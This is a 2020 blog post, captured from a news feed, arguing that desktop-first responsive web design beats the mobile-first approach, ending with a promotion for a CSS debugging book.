December 27, 2020 | https://planflow.dev/blog/why-mobile-first-is-a-bad-idea | <a href="https://web.archive.org/web/*/https://planflow.dev/blog/why-mobile-first-is-a-bad-idea">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>(This article was originally published in </em><a target="_blank" title="https://gumroad.com/l/Debbg/z823cp8" href="https://gumroad.com/l/Debbg/z823cp8"><em>How To Debug CSS</em></a><em>)</em></p><p>While I could always understand the idea behind the mobile-first approach to developing websites. It always felt….off to me.</p><p>Mobile-first, which is a design approach that involves starting with the mobile version of a website before the desktop version, is a great idea in theory.&nbsp;</p><p>The problem comes when it meets reality.</p><p>There are countless stories of developers who, upon hearing about (and even learning how to design with) a mobile first approach, ultimately ended up reverting back to, and starting with the desktop versions of their sites.</p><p>According to a <a target="_blank" title="https://twitter.com/KevinJPowell/status/1244427032957784066" href="https://twitter.com/KevinJPowell/status/1244427032957784066">survey</a> conducted by Kevin Powell (a GREAT frontend tutorial maker), the majority (61.5%) of developers prefer to start with the desktop first:</p><p><img src="https://media.graphcms.com/gkrvHBiXR3ON7pcIkwSG" alt="Screenshot 2020-12-27 at 22.39.13.png" title="Screenshot 2020-12-27 at 22.39.13.png" width="597" height="413"></p><p><em><strong>(this after almost 8 years of the mobile-first approach being championed almost exclusively)</strong></em></p><p>This is a sentiment that I have also found to be true on many message boards and online discussions that I’ve seen around responsive web design.</p><p>It is interesting that despite this clear evidence that the majority of developers simply do not inherently want to design websites with a mobile-first approach, the idea is still being championed as the preferred methodology.</p><p>Let’s explore why this is.</p><h2>Why Mobile-First is often championed</h2><p>There are two main reasons why the mobile-first approach is often touted as the best approach to take for developing a responsive website:</p><p>	<strong>1.	Better UX, at every screen size </strong></p><p>The first is that it provides a better user experience at every screen size, because it best optimizes for the smaller screen sizes as well as the larger ones. The argument is that it does this by focusing on only the most important elements of the layout, as that is all that can fit on the smaller mobile screens. And that this focused approach ‘scales up’.</p><p>The trouble with this is that it simply does not seem to hold up to scrutiny.&nbsp;</p><p>What actually seems to end up happening with mobile-first is that the overall site just becomes less creative in general.&nbsp;</p><p>Most mobile sites (and their subsequent desktop sites) end up simply looking the same as every other website out there.</p><p>We’ll see why this is the case shortly (the diagram at the top of this post will give you an idea).</p><p>	<strong>2.	Better organized (and easier to create) CSS </strong></p><p>The second reason why mobile-first is often regarded as the best way to develop a responsive website is that on most sites, the ‘default’ CSS styles (i.e. the styles that are written outside of the scope of media queries) are often the ones that are aimed at the smaller, mobile screen sizes.&nbsp;</p><p><strong>Typical CSS file organization for a responsive website:</strong></p><p><img src="https://media.graphcms.com/output=format:png/resize=height:748,width:996/sPcNpTKARkKzOUO3KzZ4" alt="typical-css-responsive-file.png" title="typical-css-responsive-file.png" width="996" height="748"></p><p>Because the typical CSS workflow of a responsive website is to add the media query related styles after the fact (because media queries are supposed to be at the bottom of the page, as mentioned above), starting with what would be your ‘default’ styles, which would be your mobile styles, seems to make more sense.</p><p>We will also shortly see why this is not exactly correct.</p><p>Let’s dive into the key reasons why, despite these two decent arguments in favor of a mobile-first approach to responsive web design, it still is not the best way to approach it.</p><h2>Why mobile-first is good in theory but bad in practice</h2><h3>You are optimizing for the sub-optimal experience</h3><p>The mobile experience <em>is</em> sub-optimal. This is not a point that is really debated. The entire point of a mobile version of a site is to deliver a lesser, but still somewhat effective version of the optimal desktop experience.</p><p>The problem with optimizing for the mobile experience, is that it does not make the overall experience optimal. It only scales up sub-optimality. The compromises that start on the mobile experience ultimately become compromises on the desktop end.</p><p><strong>It only degrades the desktop experience.</strong></p><p>The desktop site is the ‘real’ site in most cases, <a target="_blank" title="https://www.reddit.com/r/webdev/comments/d7nj58/how_do_you_deal_with_mobile_first_and/" href="https://www.reddit.com/r/webdev/comments/d7nj58/how_do_you_deal_with_mobile_first_and/">most clients</a> expect to see a desktop site first.</p><p>Desktop-first focuses on the design problem that people actually care about, while mobile-first focuses on the CSS organization problem, which only developers do.</p><p>Instead of starting with the sub-optimal experience (that helps the developer), it’s much better overall to optimize for the optimal experience (that helps the user) and then scale down.</p><h3>It’s an unnatural way to design</h3><p>Because design is an intuitive process fundamentally, any design approach that requires you to have to ‘get over yourself’ is probably a bad idea.</p><p>Design is basically a process of guiding the user, by developing an interface based on what guides <em>you</em>, naturally.</p><p>For this to be effective, context is key, and being able to maximally utilize the scope of experience that the user has, gives you more ‘surface area’ with which to appropriately meet the context and guide the user.</p><p>For this reason, It’s better to start at the ‘largest’ possible context for this.&nbsp;</p><p>For example, for a professional sports match. What has a better chance of delivering the ‘fullest’, more complete experience to you?&nbsp;</p><p><strong>The actual, ‘bigger’, more natural, live game:</strong></p><p><img src="https://media.graphcms.com/p5ESEubnQNKm7eEPdLmR" alt="man-290186_1920.jpg" title="man-290186_1920.jpg" width="1920" height="1275"></p><p><strong>Or the TV experience?</strong></p><p><img src="https://media.graphcms.com/qUwYVApRW22XXnKOCOqd" alt="soccer-3496510_1920.jpg" title="soccer-3496510_1920.jpg" width="1920" height="1280"></p><p><em><strong>What should be optimized for first to deliver the best final result in both cases?</strong></em></p><p>The Desktop experience encompasses what is essential information within a mobile context. Mobile does not necessarily have what is essential to a desktop context.</p><p>This is why desktop-first <a target="_blank" title="https://www.reddit.com/r/webdev/comments/cy1xuk/do_you_feel_like_desktop_web_dev_is_fun_and/" href="https://www.reddit.com/r/webdev/comments/cy1xuk/do_you_feel_like_desktop_web_dev_is_fun_and/">seems to feel more natural</a> to most developers. It’s just enough constraint for the task of navigating a website, but not too much.</p><p>Leaving an ideal amount of room for creativity. Which mobile-first kills.</p><h3>Mobile-first kills creativity</h3><p>With mobile-first, there are too many unanswered questions.</p><p>Questions that should have been answered at the desktop level, ultimately never get answered.</p><p>At the desktop level, the challenges are often much bigger, and require more creativity to solve. Because the questions you need to ask at smaller screens are simply fractals (or subsets) of their larger counterparts, It’s much better to answer them first at the larger sizes, which then makes it easier to answer subsequent smaller size and mobile design questions.</p><p>With a mobile-first approach, you can fall into the trap of getting so fixated on the subsets that you fail in giving people the essence of the page. This essence is what the initial answers to the bigger design questions give you.</p><p>To get that essence, in the same way that you would have to crush grapes at scale, and then gradually go through a distillation process to finally achieve a wine. To get a mobile site that really gets to the core of a site, its best to start with the desktop version. And then gradually filter or scale down.</p><h3>Mobile-First makes design too formulaic</h3><p>Because of the degree of constraint in the mobile-first approach, and the lack of room for creativity that this engenders, developers naturally seek out tried and true patterns that they can follow.&nbsp;</p><p>This isn't a bad thing, as we all use inspiration to a degree. The issue is that, just as we’ve seen with frameworks like Bootstrap. Too much of a formulaic approach often leads to a level of sameness that literally bores everyone.</p><p>Mobile-first may be one the things contributing to the ever increasing ‘sameness’ of the web that we see nowadays.</p><p>This consequently reduces the kind of web activity that we want (such as conversions) across the board. People are simply less engaged, and tuning these websites out.</p><p>Imagine if those ever-quirky and endlessly interesting sites of the late 90’s, early 2000’s like the ones we used to find on GeoCities and Angelfire were thinking about ‘mobile first’.&nbsp;</p><p>Do you think they would have achieved the same level of uniqueness? I doubt it.</p><h2>An alternative (desktop-first) approach</h2><p>The mental shift that we should make is not desktop to mobile first.</p><p>It's not to simply squish things on the desktop either.</p><p>The correct mental shift is to say, once we have a desktop version, what do we need to resize, rearrange, or remove in order to have an optimal yet still equally informative experience on mobile?</p><p>We should be asking how we can make the mobile experience a good fractal of the desktop experience.&nbsp;</p><p>We should ask what we are trying to achieve with our desktop site, and how we can achieve (even if only a little bit) the same on smaller screens.</p><p>The way that we should design our websites should be to start with the desktop first, and then scale down with empathy, asking the big designs questions before we start to ask the smaller ones.</p><p>We should start our web design process at the bottom of the CSS file, with the desktop sized media query, instead of making those first global (mobile-first) styles.&nbsp;</p><p>After that, once we have answered our biggest design questions at the desktop level, we can scale down (and up in the code) with more media queries (in the case of the smaller sizes) and with the default global styles in the case of the absolute smallest mobile size. Taking out all but the necessary.&nbsp;</p><p>Ultimately, this feels like the most natural approach to take.</p><p>--</p><p><em>This is an excerpt from </em><a title="https://gumroad.com/l/Debbg/z823cp8" href="https://gumroad.com/l/Debbg/z823cp8"><em>How To Debug CSS</em></a><em>. A book that’s written to solve the problem outlined in this post. To help take you from a vague level of understanding with CSS, to an intuitive, know it like the back of your hand level of understanding. Enabling you to not only create layouts with ease, but to debug any issues that come up with them as you do so.</em></p><p><em>The book is currently available for pre-order with a temporary (40%!) pre-launch discount on the link above. You may purchase by clicking on the link above! Or by clicking here: </em><a title="https://gumroad.com/l/Debbg/z823cp8" href="https://gumroad.com/l/Debbg/z823cp8"><em>“How To Debug CSS”</em></a><em>.</em></p></div></div>]]>
            </description>
            <link>https://planflow.dev/blog/why-mobile-first-is-a-bad-idea</link>
            <guid isPermaLink="false">hacker-news-small-sites-25555623</guid>
            <pubDate>Mon, 28 Dec 2020 00:46:08 GMT</pubDate>
        </item>
    </channel>
</rss>
